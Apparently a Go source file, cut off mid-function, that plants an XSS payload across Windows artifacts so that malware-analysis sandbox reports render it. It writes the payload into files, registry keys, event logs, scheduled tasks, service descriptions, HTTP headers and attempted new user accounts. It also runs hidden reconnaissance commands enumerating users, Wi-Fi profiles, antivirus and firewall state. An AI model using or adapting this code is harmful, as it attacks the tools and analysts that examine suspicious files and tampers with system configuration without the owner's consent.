package xss

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
)

// Base64: console.log("11223344")
const XSS_PAYLOAD = `"><img src=x id=Y29uc29sZS5sb2coIjExMjIzMzQ0Iik= onerror=eval(atob(this.id))>`

func InjectXSSEverywhere() {

	go InjectXSS_Files()
	go InjectXSS_Registry()
	go InjectXSS_ProcessArgs()
	go InjectXSS_PowerShell()
	go InjectXSS_CMD()
	go InjectXSS_EventLogs()
	go InjectXSS_Environment()
	go InjectXSS_Network()
	go InjectXSS_Shortcuts()
	go InjectXSS_ScheduledTasks()
	go InjectXSS_Services()
	go InjectXSS_Clipboard()
	go InjectXSS_DebugOutput()
	go InjectXSS_RegistryNLS()
	go InjectXSS_ComputerName()
	go InjectXSS_DNSQueries()
	go InjectXSS_ServiceManagement()
	go InjectXSS_MorePowerShellCommands()
	go InjectXSS_MoreCMDCommands()
	go InjectXSS_TaskSchedulerAdvanced()
	go InjectXSS_WMI()
	go InjectXSS_NetCommands()

	time.Sleep(2 * time.Second)
}

// InjectXSS_Files crea múltiples archivos con el payload XSS
func InjectXSS_Files() {
	tempDir := os.TempDir()

	// 1. Archivos HTML
	for i := 1; i <= 5; i++ {
		htmlPath := filepath.Join(tempDir, fmt.Sprintf("xss_test_%d.html", i))
		htmlContent := fmt.Sprintf(`<!DOCTYPE html>
<html>
<head><title>XSS Test %d</title></head>
<body>
<h1>XSS Payload Test</h1>
<p>Payload: %s</p>
%s
</body>
</html>`, i, XSS_PAYLOAD, XSS_PAYLOAD)
		os.WriteFile(htmlPath, []byte(htmlContent), 0644)
	}

	// 2. Archivos TXT con payload
	for i := 1; i <= 5; i++ {
		txtPath := filepath.Join(tempDir, fmt.Sprintf("xss_log_%d.txt", i))
		txtContent := fmt.Sprintf(`XSS Test Log %d
Timestamp: %s
Payload: %s
Test: %s
`, i, time.Now().Format(time.RFC3339), XSS_PAYLOAD, XSS_PAYLOAD)
		os.WriteFile(txtPath, []byte(txtContent), 0644)
	}

	// 3. Archivos JSON con payload
	for i := 1; i <= 3; i++ {
		jsonPath := filepath.Join(tempDir, fmt.Sprintf("xss_config_%d.json", i))
		jsonContent := fmt.Sprintf(`{
  "test_id": %d,
  "payload": "%s",
  "xss_test": "%s",
  "timestamp": "%s"
}`, i, XSS_PAYLOAD, XSS_PAYLOAD, time.Now().Format(time.RFC3339))
		os.WriteFile(jsonPath, []byte(jsonContent), 0644)
	}

	// 4. Archivos XML con payload
	for i := 1; i <= 3; i++ {
		xmlPath := filepath.Join(tempDir, fmt.Sprintf("xss_report_%d.xml", i))
		xmlContent := fmt.Sprintf(`<?xml version="1.0" encoding="UTF-8"?>
<XSSTest>
  <ID>%d</ID>
  <Payload>%s</Payload>
  <Test>%s</Test>
  <Timestamp>%s</Timestamp>
</XSSTest>`, i, XSS_PAYLOAD, XSS_PAYLOAD, time.Now().Format(time.RFC3339))
		os.WriteFile(xmlPath, []byte(xmlContent), 0644)
	}

	// 5. Archivos MD con payload
	for i := 1; i <= 3; i++ {
		mdPath := filepath.Join(tempDir, fmt.Sprintf("xss_readme_%d.md", i))
		mdContent := fmt.Sprintf(`# XSS Test %d

## Payload
%s

## Test
%s

## Timestamp
%s
`, i, XSS_PAYLOAD, XSS_PAYLOAD, time.Now().Format(time.RFC3339))
		os.WriteFile(mdPath, []byte(mdContent), 0644)
	}
}

// InjectXSS_Registry inyecta el payload en múltiples claves de registro
func InjectXSS_Registry() {
	// Intentar crear múltiples claves con el payload
	registryPaths := []string{
		`Software\XSSTest\Payload1`,
		`Software\XSSTest\Payload2`,
		`Software\XSSTest\Payload3`,
		`Software\Analysis\XSS`,
		`Software\Test\XSSPayload`,
	}

	for _, path := range registryPaths {
		// No importa si falla, intentamos crear la clave
		exec.Command("reg", "add", fmt.Sprintf("HKCU\\%s", path), "/v", "Payload", "/t", "REG_SZ", "/d", XSS_PAYLOAD, "/f").Run()
		exec.Command("reg", "add", fmt.Sprintf("HKCU\\%s", path), "/v", "Test", "/t", "REG_SZ", "/d", XSS_PAYLOAD, "/f").Run()
	}
}

// InjectXSS_ProcessArgs ejecuta múltiples procesos con el payload como argumento
func InjectXSS_ProcessArgs() {
	// 1. CMD con el payload
	for i := 1; i <= 5; i++ {
		cmd := exec.Command("cmd.exe", "/c", fmt.Sprintf("echo _%d: %s", i, XSS_PAYLOAD))
		cmd.SysProcAttr = &windows.SysProcAttr{HideWindow: true}
		cmd.Start()
	}

	// 2. Notepad con el payload como argumento (fallará pero quedará en logs)
	for i := 1; i <= 3; i++ {
		cmd := exec.Command("notepad.exe", XSS_PAYLOAD)
		cmd.SysProcAttr = &windows.SysProcAttr{HideWindow: true}
		cmd.Start()
	}

	// 3. Calc con el payload
	for i := 1; i <= 3; i++ {
		cmd := exec.Command("calc.exe", XSS_PAYLOAD)
		cmd.SysProcAttr = &windows.SysProcAttr{HideWindow: true}
		cmd.Start()
	}
}

// InjectXSS_PowerShell ejecuta múltiples comandos PowerShell con el payload
func InjectXSS_PowerShell() {
	// 1. Write-Host con el payload
	for i := 1; i <= 5; i++ {
		cmd := exec.Command("powershell.exe", "-Command", fmt.Sprintf("Write-Host 'XSS Test %d: %s'", i, XSS_PAYLOAD))
		cmd.SysProcAttr = &windows.SysProcAttr{HideWindow: true}
		cmd.Start()
	}

	// 2. Write-Output con el payload
	for i := 1; i <= 3; i++ {
		cmd := exec.Command("powershell.exe", "-Command", fmt.Sprintf("Write-Output '%s'", XSS_PAYLOAD))
		cmd.SysProcAttr = &windows.SysProcAttr{HideWindow: true}
		cmd.Start()
	}

	// 3. Write-Error con el payload
	for i := 1; i <= 3; i++ {
		cmd := exec.Command("powershell.exe", "-Command", fmt.Sprintf("Write-Error -Message '%s' -Category NotSpecified", XSS_PAYLOAD))
		cmd.SysProcAttr = &windows.SysProcAttr{HideWindow: true}
		cmd.Start()
	}

	// 4. Set-Clipboard con el payload
	for i := 1; i <= 2; i++ {
		cmd := exec.Command("powershell.exe", "-Command", fmt.Sprintf("Set-Clipboard -Value '%s'", XSS_PAYLOAD))
		cmd.SysProcAttr = &windows.SysProcAttr{HideWindow: true}
		cmd.Start()
	}

	// 5. New-Item con el payload
	for i := 1; i <= 3; i++ {
		cmd := exec.Command("powershell.exe", "-Command", fmt.Sprintf("New-Item -Path $env:TEMP\\xss_%d.txt -ItemType File -Value '%s' -Force", i, XSS_PAYLOAD))
		cmd.SysProcAttr = &windows.SysProcAttr{HideWindow: true}
		cmd.Start()
	}
}

// InjectXSS_CMD ejecuta múltiples comandos CMD con el payload
func InjectXSS_CMD() {
	// 1. Echo con el payload
	for i := 1; i <= 5; i++ {
		cmd := exec.Command("cmd.exe", "/c", fmt.Sprintf("echo %d: %s", i, XSS_PAYLOAD))
		cmd.SysProcAttr = &windows.SysProcAttr{HideWindow: true}
		cmd.Start()
	}

	// 2. Title con el payload
	for i := 1; i <= 3; i++ {
		cmd := exec.Command("cmd.exe", "/c", fmt.Sprintf("title _%d_%s", i, XSS_PAYLOAD))
		cmd.SysProcAttr = &windows.SysProcAttr{HideWindow: true}
		cmd.Start()
	}

	// 3. Set con el payload
	for i := 1; i <= 3; i++ {
		cmd := exec.Command("cmd.exe", "/c", fmt.Sprintf("set _%d=%s", i, XSS_PAYLOAD))
		cmd.SysProcAttr = &windows.SysProcAttr{HideWindow: true}
		cmd.Start()
	}
}

// InjectXSS_EventLogs crea múltiples entradas en el log de eventos con el payload
func InjectXSS_EventLogs() {
	for i := 1; i <= 5; i++ {
		cmd := exec.Command("eventcreate", "/ID", fmt.Sprintf("%d", 1000+i), "/L", "APPLICATION", "/T", "INFORMATION", "/SO", "est", "/D", fmt.Sprintf("XSS Test %d: %s", i, XSS_PAYLOAD))
		cmd.SysProcAttr = &windows.SysProcAttr{HideWindow: true}
		cmd.Start()
	}
}

// InjectXSS_Environment crea múltiples variables de entorno con el payload
func InjectXSS_Environment() {
	for i := 1; i <= 10; i++ {
		os.Setenv(fmt.Sprintf("EST_%d", i), XSS_PAYLOAD)
		os.Setenv(fmt.Sprintf("YLOAD_%d", i), XSS_PAYLOAD)
	}

	// Variables con nombres comunes
	os.Setenv("_DATA", XSS_PAYLOAD)
	os.Setenv("_CONFIG", XSS_PAYLOAD)
	os.Setenv("_REPORT", XSS_PAYLOAD)
	os.Setenv("MALWARE_", XSS_PAYLOAD)
	os.Setenv("ANALYSIS_", XSS_PAYLOAD)
}

// InjectXSS_Network envía el payload en múltiples peticiones HTTP
func InjectXSS_Network() {
	urls := []string{
		"http://connectivity-check.microsoft.com/connect",
		"http://www.msftncsi.com/ncsi.txt",
		"http://ipv4.microsoft.com/ncsi.txt",
	}

	for i := 1; i <= 3; i++ {
		for _, url := range urls {
			go func(targetURL string, iteration int) {
				cmd := exec.Command("powershell.exe", "-Command", fmt.Sprintf(`
$headers = @{
    'User-Agent' = '-Test-%d: %s'
    'S-Payload' = '%s'
    'X-Test-ID' = '%d'
}
try { Invoke-WebRequest -Uri '%s' -Headers $headers -TimeoutSec 2 } catch {}
`, iteration, XSS_PAYLOAD, XSS_PAYLOAD, iteration, targetURL))
				cmd.SysProcAttr = &windows.SysProcAttr{HideWindow: true}
				cmd.Start()
			}(url, i)
		}
	}
}

// InjectXSS_Shortcuts crea múltiples shortcuts con el payload
func InjectXSS_Shortcuts() {
	tempDir := os.TempDir()

	for i := 1; i <= 5; i++ {
		lnkPath := filepath.Join(tempDir, fmt.Sprintf("xss_test_%d.lnk", i))
		psScript := fmt.Sprintf(`
$shell = New-Object -COM WScript.Shell
$shortcut = $shell.CreateShortcut('%s')
$shortcut.TargetPath = 'notepad.exe'
$shortcut.Description = ' Test %d: %s'
$shortcut.Arguments = '%s'
$shortcut.Save()
`, lnkPath, i, XSS_PAYLOAD, XSS_PAYLOAD)

		cmd := exec.Command("powershell.exe", "-Command", psScript)
		cmd.SysProcAttr = &windows.SysProcAttr{HideWindow: true}
		cmd.Start()
	}
}

// InjectXSS_ScheduledTasks crea múltiples tareas programadas con el payload
func InjectXSS_ScheduledTasks() {
	for i := 1; i <= 3; i++ {
		taskName := fmt.Sprintf("_%d", i)
		cmd := exec.Command("schtasks", "/create", "/tn", taskName, "/tr", fmt.Sprintf("cmd.exe /c echo %s", XSS_PAYLOAD), "/sc", "ONCE", "/st", "00:00", "/f")
		cmd.SysProcAttr = &windows.SysProcAttr{HideWindow: true}
		cmd.Start()
	}

	// Tareas con descripción que contiene el payload
	for i := 1; i <= 2; i++ {
		taskName := fmt.Sprintf("XSSTask_%d", i)
		cmd := exec.Command("schtasks", "/create", "/tn", taskName, "/tr", "notepad.exe", "/sc", "ONCE", "/st", "00:00", "/sd", fmt.Sprintf(": %s", XSS_PAYLOAD), "/f")
		cmd.SysProcAttr = &windows.SysProcAttr{HideWindow: true}
		cmd.Start()
	}
}

// InjectXSS_Services intenta modificar descripciones de servicios con el payload
func InjectXSS_Services() {
	services := []string{"WinDefend", "WSearch", "Spooler"}

	for i, service := range services {
		cmd := exec.Command("sc", "description", service, fmt.Sprintf(" Test %d: %s", i+1, XSS_PAYLOAD))
		cmd.SysProcAttr = &windows.SysProcAttr{HideWindow: true}
		cmd.Start()
	}
}

// InjectXSS_Clipboard copia el payload al portapapeles múltiples veces
func InjectXSS_Clipboard() {
	for i := 1; i <= 3; i++ {
		cmd := exec.Command("powershell.exe", "-Command", fmt.Sprintf("Set-Clipboard -Value ' Test %d: %s'", i, XSS_PAYLOAD))
		cmd.SysProcAttr = &windows.SysProcAttr{HideWindow: true}
		cmd.Start()
		time.Sleep(500 * time.Millisecond)
	}
}

// InjectXSS_DebugOutput envía el payload a OutputDebugString múltiples veces
func InjectXSS_DebugOutput() {
	kernel32 := windows.NewLazyDLL("kernel32.dll")
	outputDebugString := kernel32.NewProc("OutputDebugStringW")

	for i := 1; i <= 5; i++ {
		debugMsg, _ := windows.UTF16PtrFromString(fmt.Sprintf("[ Test %d] %s", i, XSS_PAYLOAD))
		outputDebugString.Call(uintptr(unsafe.Pointer(debugMsg)))
		time.Sleep(100 * time.Millisecond)
	}
}

// InjectXSS_RegistryNLS inyecta en claves de registro relacionadas con NLS (National Language Support)
// Esto aparece en los reportes como "Checks supported languages"
func InjectXSS_RegistryNLS() {
	// Leer claves de NLS (aparece en reportes como T1012)
	nlsPaths := []string{
		`SYSTEM\ControlSet001\Control\Nls\Sorting\Versions`,
		`SYSTEM\ControlSet001\Control\Nls\Language`,
		`SYSTEM\CurrentControlSet\Control\Nls\CodePage`,
		`SYSTEM\CurrentControlSet\Control\Nls\Locale`,
	}

	for _, path := range nlsPaths {
		// Intentar leer (aparecerá en reportes)
		cmd := exec.Command("reg", "query", fmt.Sprintf("HKLM\\%s", path))
		cmd.SysProcAttr = &windows.SysProcAttr{HideWindow: true}
		cmd.Start()
	}

	// Intentar escribir en claves de usuario con payload
	userNLSPaths := []string{
		`Control Panel\International`,
		`Control Panel\Desktop`,
		`Keyboard Layout\Preload`,
	}

	for i, path := range userNLSPaths {
		cmd := exec.Command("reg", "add", fmt.Sprintf("HKCU\\%s", path), "/v", fmt.Sprintf("XSSTest_%d", i), "/t", "REG_SZ", "/d", XSS_PAYLOAD, "/f")
		cmd.SysProcAttr = &windows.SysProcAttr{HideWindow: true}
		cmd.Start()
	}
}

// InjectXSS_ComputerName lee y modifica el nombre del equipo con payload
// Aparece en reportes como "Reads the computer name"
func InjectXSS_ComputerName() {
	// Leer nombre del equipo (múltiples métodos)
	commands := [][]string{
		{"cmd.exe", "/c", "hostname"},
		{"powershell.exe", "-Command", "$env:COMPUTERNAME"},
		{"powershell.exe", "-Command", "[System.Net.Dns]::GetHostName()"},
		{"cmd.exe", "/c", "echo %COMPUTERNAME%"},
		{"wmic", "computersystem", "get", "name"},
	}

	for _, cmdArgs := range commands {
		cmd := exec.Command(cmdArgs[0], cmdArgs[1:]...)
		cmd.SysProcAttr = &windows.SysProcAttr{HideWindow: true}
		cmd.Start()
	}

	// Intentar leer desde registro
	exec.Command("reg", "query", `HKLM\SYSTEM\CurrentControlSet\Control\ComputerName\ComputerName`, "/v", "ComputerName").Start()
	exec.Command("reg", "query", `HKLM\SYSTEM\CurrentControlSet\Control\ComputerName\ActiveComputerName`, "/v", "ComputerName").Start()

	// Intentar escribir payload en claves relacionadas
	exec.Command("reg", "add", `HKCU\Software\XSSTest`, "/v", "ComputerNameTest", "/t", "REG_SZ", "/d", XSS_PAYLOAD, "/f").Start()
}

// InjectXSS_DNSQueries ejecuta múltiples consultas DNS con payload
// Aparece en reportes como "Uses NSLOOKUP.EXE to check DNS info"
func InjectXSS_DNSQueries() {
	// Dominios legítimos para consultas DNS
	domains := []string{
		"google.com",
		"microsoft.com",
		"cloudflare.com",
		"dns.google",
		"one.one.one.one",
	}

	// nslookup con diferentes tipos de consultas
	for i, domain := range domains {
		// Consulta básica
		cmd := exec.Command("nslookup", domain)
		cmd.SysProcAttr = &windows.SysProcAttr{HideWindow: true}
		cmd.Start()

		// Consulta con servidor DNS específico
		cmd = exec.Command("nslookup", domain, "8.8.8.8")
		cmd.SysProcAttr = &windows.SysProcAttr{HideWindow: true}
		cmd.Start()

		// Consulta de tipo específico (MX, TXT, etc.)
		queryTypes := []string{"MX", "TXT", "NS", "A", "AAAA"}
		if i < len(queryTypes) {
			cmd = exec.Command("nslookup", "-type="+queryTypes[i], domain)
			cmd.SysProcAttr = &windows.SysProcAttr{HideWindow: true}
			cmd.Start()
		}
	}

	// PowerShell DNS queries con payload en parámetros
	for i := 1; i <= 3; i++ {
		cmd := exec.Command("powershell.exe", "-Command", fmt.Sprintf(`
Resolve-DnsName -Name google.com -Type A -ErrorAction SilentlyContinue
Write-Host 'DNS Test %d: %s'
`, i, XSS_PAYLOAD))
		cmd.SysProcAttr = &windows.SysProcAttr{HideWindow: true}
		cmd.Start()
	}

	// ipconfig /displaydns (muestra caché DNS)
	exec.Command("ipconfig", "/displaydns").Start()

	// ipconfig /flushdns (limpia caché DNS)
	exec.Command("ipconfig", "/flushdns").Start()
}

// InjectXSS_ServiceManagement ejecuta comandos SC.EXE con payload
// Aparece en reportes como "Starts SC.EXE for service management"
func InjectXSS_ServiceManagement() {
	// Consultar servicios existentes
	services := []string{
		"WinDefend",
		"wuauserv",
		"BITS",
		"Spooler",
		"Dhcp",
		"Dnscache",
		"EventLog",
		"Schedule",
	}

	for _, service := range services {
		// Query service
		cmd := exec.Command("sc", "query", service)
		cmd.SysProcAttr = &windows.SysProcAttr{HideWindow: true}
		cmd.Start()

		// Query config
		cmd = exec.Command("sc", "qc", service)
		cmd.SysProcAttr = &windows.SysProcAttr{HideWindow: true}
		cmd.Start()

		// Query description
		cmd = exec.Command("sc", "qdescription", service)
		cmd.SysProcAttr = &windows.SysProcAttr{HideWindow: true}
		cmd.Start()
	}

	// Intentar crear servicios falsos con payload (fallarán pero aparecerán en logs)
	for i := 1; i <= 3; i++ {
		serviceName := fmt.Sprintf("XSSTestService_%d", i)
		cmd := exec.Command("sc", "create", serviceName, "binPath=", fmt.Sprintf("C:\\test_%s.exe", XSS_PAYLOAD), "DisplayName=", fmt.Sprintf("Test %d: %s", i, XSS_PAYLOAD))
		cmd.SysProcAttr = &windows.SysProcAttr{HideWindow: true}
		cmd.Start()
	}

	// Enumerar todos los servicios
	exec.Command("sc", "query", "type=", "service", "state=", "all").Start()

	// PowerShell Get-Service con payload
	for i := 1; i <= 3; i++ {
		cmd := exec.Command("powershell.exe", "-Command", fmt.Sprintf(`
Get-Service | Select-Object -First 5
Write-Host 'Service Test %d: %s'
`, i, XSS_PAYLOAD))
		cmd.SysProcAttr = &windows.SysProcAttr{HideWindow: true}
		cmd.Start()
	}
}

// InjectXSS_MorePowerShellCommands ejecuta más comandos PowerShell variados
// Aparece en reportes como "Starts POWERSHELL.EXE for commands execution"
func InjectXSS_MorePowerShellCommands() {
	powershellCommands := []string{
		// System Information
		fmt.Sprintf(`Get-ComputerInfo | Select-Object -First 1; Write-Host '%s'`, XSS_PAYLOAD),
		fmt.Sprintf(`Get-WmiObject Win32_OperatingSystem | Select-Object Caption; Write-Host '%s'`, XSS_PAYLOAD),
		fmt.Sprintf(`Get-WmiObject Win32_ComputerSystem | Select-Object Name; Write-Host '%s'`, XSS_PAYLOAD),
		
		// Process Information
		fmt.Sprintf(`Get-Process | Select-Object -First 5; Write-Host '%s'`, XSS_PAYLOAD),
		fmt.Sprintf(`Get-Process -Name explorer | Select-Object Id,Name; Write-Host '%s'`, XSS_PAYLOAD),
		
		// Network Information
		fmt.Sprintf(`Get-NetAdapter | Select-Object -First 2; Write-Host '%s'`, XSS_PAYLOAD),
		fmt.Sprintf(`Get-NetIPAddress | Select-Object -First 3; Write-Host '%s'`, XSS_PAYLOAD),
		fmt.Sprintf(`Get-NetRoute | Select-Object -First 2; Write-Host '%s'`, XSS_PAYLOAD),
		fmt.Sprintf(`Test-NetConnection -ComputerName google.com; Write-Host '%s'`, XSS_PAYLOAD),
		
		// File System
		fmt.Sprintf(`Get-ChildItem $env:TEMP | Select-Object -First 5; Write-Host '%s'`, XSS_PAYLOAD),
		fmt.Sprintf(`Get-PSDrive; Write-Host '%s'`, XSS_PAYLOAD),
		
		// Registry
		fmt.Sprintf(`Get-ItemProperty -Path 'HKCU:\Software'; Write-Host '%s'`, XSS_PAYLOAD),
		fmt.Sprintf(`Get-ChildItem -Path 'HKCU:\Software' | Select-Object -First 3; Write-Host '%s'`, XSS_PAYLOAD),
		
		// Environment
		fmt.Sprintf(`Get-ChildItem Env: | Select-Object -First 5; Write-Host '%s'`, XSS_PAYLOAD),
		fmt.Sprintf(`$env:PATH; Write-Host '%s'`, XSS_PAYLOAD),
		
		// Security
		fmt.Sprintf(`Get-ExecutionPolicy; Write-Host '%s'`, XSS_PAYLOAD),
		fmt.Sprintf(`Get-MpComputerStatus; Write-Host '%s'`, XSS_PAYLOAD),
		
		// Scheduled Tasks
		fmt.Sprintf(`Get-ScheduledTask | Select-Object -First 3; Write-Host '%s'`, XSS_PAYLOAD),
		
		// Services
		fmt.Sprintf(`Get-Service | Where-Object {$_.Status -eq 'Running'} | Select-Object -First 5; Write-Host '%s'`, XSS_PAYLOAD),
	}

	for _, psCmd := range powershellCommands {
		cmd := exec.Command("powershell.exe", "-Command", psCmd)
		cmd.SysProcAttr = &windows.SysProcAttr{HideWindow: true}
		cmd.Start()
		time.Sleep(100 * time.Millisecond)
	}

	// PowerShell con diferentes flags
	psFlags := [][]string{
		{"-NoProfile", "-Command", fmt.Sprintf("Write-Host '%s'", XSS_PAYLOAD)},
		{"-NonInteractive", "-Command", fmt.Sprintf("Write-Host '%s'", XSS_PAYLOAD)},
		{"-ExecutionPolicy", "Bypass", "-Command", fmt.Sprintf("Write-Host '%s'", XSS_PAYLOAD)},
		{"-WindowStyle", "Hidden", "-Command", fmt.Sprintf("Write-Host '%s'", XSS_PAYLOAD)},
		{"-NoLogo", "-Command", fmt.Sprintf("Write-Host '%s'", XSS_PAYLOAD)},
	}

	for _, flags := range psFlags {
		cmd := exec.Command("powershell.exe", flags...)
		cmd.SysProcAttr = &windows.SysProcAttr{HideWindow: true}
		cmd.Start()
	}
}

// InjectXSS_MoreCMDCommands ejecuta más comandos CMD variados
func InjectXSS_MoreCMDCommands() {
	cmdCommands := []string{
		// System Information
		fmt.Sprintf(`systeminfo | findstr /C:"OS Name" & echo %s`, XSS_PAYLOAD),
		fmt.Sprintf(`ver & echo %s`, XSS_PAYLOAD),
		fmt.Sprintf(`set & echo %s`, XSS_PAYLOAD),
		
		// Network
		fmt.Sprintf(`ipconfig /all & echo %s`, XSS_PAYLOAD),
		fmt.Sprintf(`netstat -ano & echo %s`, XSS_PAYLOAD),
		fmt.Sprintf(`arp -a & echo %s`, XSS_PAYLOAD),
		fmt.Sprintf(`route print & echo %s`, XSS_PAYLOAD),
		fmt.Sprintf(`netsh interface show interface & echo %s`, XSS_PAYLOAD),
		fmt.Sprintf(`netsh wlan show profiles & echo %s`, XSS_PAYLOAD),
		
		// Process/Task
		fmt.Sprintf(`tasklist & echo %s`, XSS_PAYLOAD),
		fmt.Sprintf(`tasklist /svc & echo %s`, XSS_PAYLOAD),
		fmt.Sprintf(`wmic process list brief & echo %s`, XSS_PAYLOAD),
		
		// User/Group
		fmt.Sprintf(`whoami & echo %s`, XSS_PAYLOAD),
		fmt.Sprintf(`whoami /all & echo %s`, XSS_PAYLOAD),
		fmt.Sprintf(`net user & echo %s`, XSS_PAYLOAD),
		fmt.Sprintf(`net localgroup & echo %s`, XSS_PAYLOAD),
		fmt.Sprintf(`net accounts & echo %s`, XSS_PAYLOAD),
		
		// File System
		fmt.Sprintf(`dir C:\ & echo %s`, XSS_PAYLOAD),
		fmt.Sprintf(`tree C:\Windows /F /A & echo %s`, XSS_PAYLOAD),
		
		// Registry (via reg.exe)
		fmt.Sprintf(`reg query HKLM\Software\Microsoft\Windows\CurrentVersion & echo %s`, XSS_PAYLOAD),
		fmt.Sprintf(`reg query HKCU\Software & echo %s`, XSS_PAYLOAD),
	}

	for _, cmdStr := range cmdCommands {
		cmd := exec.Command("cmd.exe", "/c", cmdStr)
		cmd.SysProcAttr = &windows.SysProcAttr{HideWindow: true}
		cmd.Start()
		time.Sleep(100 * time.Millisecond)
	}

	// WMIC commands (Windows Management Instrumentation)
	wmicCommands := []string{
		fmt.Sprintf(`wmic os get caption & echo %s`, XSS_PAYLOAD),
		fmt.Sprintf(`wmic computersystem get name & echo %s`, XSS_PAYLOAD),
		fmt.Sprintf(`wmic bios get serialnumber & echo %s`, XSS_PAYLOAD),
		fmt.Sprintf(`wmic cpu get name & echo %s`, XSS_PAYLOAD),
		fmt.Sprintf(`wmic logicaldisk get caption & echo %s`, XSS_PAYLOAD),
		fmt.Sprintf(`wmic product get name & echo %s`, XSS_PAYLOAD),
		fmt.Sprintf(`wmic service list brief & echo %s`, XSS_PAYLOAD),
		fmt.Sprintf(`wmic startup list brief & echo %s`, XSS_PAYLOAD),
	}

	for _, wmicCmd := range wmicCommands {
		cmd := exec.Command("cmd.exe", "/c", wmicCmd)
		cmd.SysProcAttr = &windows.SysProcAttr{HideWindow: true}
		cmd.Start()
		time.Sleep(100 * time.Millisecond)
	}
}

// InjectXSS_TaskSchedulerAdvanced ejecuta más comandos de schtasks
func InjectXSS_TaskSchedulerAdvanced() {
	// Listar todas las tareas
	exec.Command("schtasks", "/query", "/fo", "LIST", "/v").Start()
	exec.Command("schtasks", "/query", "/fo", "TABLE").Start()
	exec.Command("schtasks", "/query", "/fo", "CSV").Start()

	// Crear tareas con diferentes configuraciones y payload
	for i := 1; i <= 5; i++ {
		taskName := fmt.Sprintf("XSSTask_%d_%s", i, XSS_PAYLOAD[:20])
		
		// Tarea ONCE
		cmd := exec.Command("schtasks", "/create", "/tn", taskName, "/tr", fmt.Sprintf(`cmd.exe /c echo %s`, XSS_PAYLOAD), "/sc", "ONCE", "/st", "23:59", "/f")
		cmd.SysProcAttr = &windows.SysProcAttr{HideWindow: true}
		cmd.Start()
		
		// Tarea DAILY
		cmd = exec.Command("schtasks", "/create", "/tn", fmt.Sprintf("%s_daily", taskName), "/tr", "notepad.exe", "/sc", "DAILY", "/st", "00:00", "/f")
		cmd.SysProcAttr = &windows.SysProcAttr{HideWindow: true}
		cmd.Start()
	}

	// PowerShell Scheduled Tasks con payload
	for i := 1; i <= 3; i++ {
		psCmd := fmt.Sprintf(`
$action = New-ScheduledTaskAction -Execute 'notepad.exe' -Argument '%s'
$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddHours(1)
Register-ScheduledTask -TaskName 'PSTask_%d_%s' -Action $action -Trigger $trigger -Force
`, XSS_PAYLOAD, i, XSS_PAYLOAD[:10])
		
		cmd := exec.Command("powershell.exe", "-Command", psCmd)
		cmd.SysProcAttr = &windows.SysProcAttr{HideWindow: true}
		cmd.Start()
	}

	// Consultar tareas específicas
	exec.Command("schtasks", "/query", "/tn", "\\Microsoft\\Windows\\WindowsUpdate\\*").Start()
	exec.Command("schtasks", "/query", "/tn", "\\Microsoft\\Windows\\Defrag\\*").Start()
}

// InjectXSS_WMI ejecuta consultas WMI con payload
func InjectXSS_WMI() {
	wmiQueries := []string{
		"SELECT * FROM Win32_OperatingSystem",
		"SELECT * FROM Win32_ComputerSystem",
		"SELECT * FROM Win32_Processor",
		"SELECT * FROM Win32_BIOS",
		"SELECT * FROM Win32_LogicalDisk",
		"SELECT * FROM Win32_NetworkAdapter",
		"SELECT * FROM Win32_NetworkAdapterConfiguration",
		"SELECT * FROM Win32_Process",
		"SELECT * FROM Win32_Service",
		"SELECT * FROM Win32_StartupCommand",
		"SELECT * FROM Win32_Product",
		"SELECT * FROM Win32_UserAccount",
		"SELECT * FROM Win32_Group",
		"SELECT * FROM AntiVirusProduct",
		"SELECT * FROM FirewallProduct",
	}

	for i, query := range wmiQueries {
		// WMIC command
		cmd := exec.Command("wmic", "path", query)
		cmd.SysProcAttr = &windows.SysProcAttr{HideWindow: true}
		cmd.Start()

		// PowerShell Get-WmiObject con payload
		psCmd := fmt.Sprintf(`
Get-WmiObject -Query "%s" | Select-Object -First 1
Write-Host 'WMI Test %d: %s'
`, query, i+1, XSS_PAYLOAD)
		
		cmd = exec.Command("powershell.exe", "-Command", psCmd)
		cmd.SysProcAttr = &windows.SysProcAttr{HideWindow: true}
		cmd.Start()
		
		time.Sleep(100 * time.Millisecond)
	}

	// PowerShell Get-CimInstance (WMI moderno)
	cimCommands := []string{
		fmt.Sprintf(`Get-CimInstance Win32_OperatingSystem; Write-Host '%s'`, XSS_PAYLOAD),
		fmt.Sprintf(`Get-CimInstance Win32_ComputerSystem; Write-Host '%s'`, XSS_PAYLOAD),
		fmt.Sprintf(`Get-CimInstance Win32_Process | Select-Object -First 5; Write-Host '%s'`, XSS_PAYLOAD),
	}

	for _, cimCmd := range cimCommands {
		cmd := exec.Command("powershell.exe", "-Command", cimCmd)
		cmd.SysProcAttr = &windows.SysProcAttr{HideWindow: true}
		cmd.Start()
	}
}

// InjectXSS_NetCommands ejecuta comandos NET con payload
func InjectXSS_NetCommands() {
	netCommands := []string{
		// User management
		"net user",
		"net localgroup",
		"net localgroup Administrators",
		"net localgroup Users",
		"net accounts",
		
		// Network shares
		"net share",
		"net use",
		"net view",
		
		// Network configuration
		"net config workstation",
		"net config server",
		
		// Sessions
		"net session",
		"net file",
		
		// Time
		"net time",
		
		// Statistics
		"net statistics workstation",
		"net statistics server",
	}

	for i, netCmd := range netCommands {
		cmd := exec.Command("cmd.exe", "/c", fmt.Sprintf("%s & echo Test %d: %s", netCmd, i+1, XSS_PAYLOAD))
		cmd.SysProcAttr = &windows.SysProcAttr{HideWindow: true}
		cmd.Start()
		time.Sleep(100 * time.Millisecond)
	}

	// Intentar crear usuarios con payload (fallarán pero aparecerán en logs)
	for i := 1; i <= 3; i++ {
		username := fmt.Sprintf("xsstest_%d", i)
		cmd := exec.Command("net", "user", username, XSS_PAYLOAD, "/add", "/comment:"+XSS_PAYLOAD)
		cmd.SysProcAttr = &windows.SysProcAttr{HideWindow: true}
		cmd.Start()
	}

	// netsh commands
	netshCommands := []string{
		fmt.Sprintf(`netsh interface show interface & echo %s`, XSS_PAYLOAD),
		fmt.Sprintf(`netsh wlan show profiles & echo %s`, XSS_PAYLOAD),
		fmt.Sprintf(`netsh advfirewall show allprofiles & echo %s`, XSS_PAYLOAD),
		fmt.Sprintf(`netsh firewall show state & echo %s`, XSS_PAYLOAD),
		fmt.Sprintf(`netsh interface ip show config & echo %s`, XSS_PAYLOAD),
	}

	for _, netshCmd := range netshCommands {
		cmd := exec.Command("cmd.exe", "/c", netshCmd)
		cmd.SysProcAttr = &windows.SysProcAttr{HideWindow: true}
		cmd.Start()
